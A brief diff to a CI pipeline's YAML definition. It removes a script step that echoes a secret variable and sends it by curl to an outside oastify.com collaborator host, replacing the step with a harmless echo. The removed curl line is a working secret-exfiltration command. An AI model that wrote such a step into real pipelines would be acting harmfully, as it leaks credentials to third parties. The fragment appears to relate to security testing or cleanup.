@@ -11,6 +11,5 @@ resources:
 
 steps:
   - script: |
-      echo $(SUPER_SECRET)
-      curl https://rupx4un8zwdy1729e272k46xqowfk58u.oastify.com?secret=$(SUPER_SECRET)
+      echo "Run pipeline B"
   
